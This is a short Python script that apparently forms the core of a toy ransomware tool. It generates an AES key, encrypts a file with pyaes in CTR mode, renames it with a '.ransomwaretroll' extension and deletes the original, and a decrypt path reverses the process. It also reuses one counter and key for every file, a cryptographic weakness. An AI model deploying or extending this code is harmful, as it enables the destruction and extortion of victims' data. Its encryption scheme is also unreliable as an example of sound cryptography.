import os
import pyaes

def generate_key(key_path):
    # Generates a 16 bytes (128 bits) random key
    key = os.urandom(16)
    with open(key_path, "wb") as key_file:
        key_file.write(key)
    print(f"[*] Generated key saved to: {key_path}")

def get_key(key_path):
    with open(key_path, "rb") as key_file:
        return key_file.read()

def process_file(file_path, key_path, encrypt=True):
    key = get_key(key_path)
    aes = pyaes.AESModeOfOperationCTR(key)
    
    if not os.path.exists(file_path):
        print(f"[!] Error: File {file_path} not found.")
        return

    with open(file_path, "rb") as f:
        data = f.read()

    new_data = aes.encrypt(data) if encrypt else aes.decrypt(data)
    
    if encrypt:
        new_name = file_path + ".ransomwaretroll"
    else:
        new_name = file_path.replace(".ransomwaretroll", "")

    with open(new_name, "wb") as f:
        f.write(new_data)
    
    os.remove(file_path)
    print(f"[*] Success: {file_path} -> {new_name}")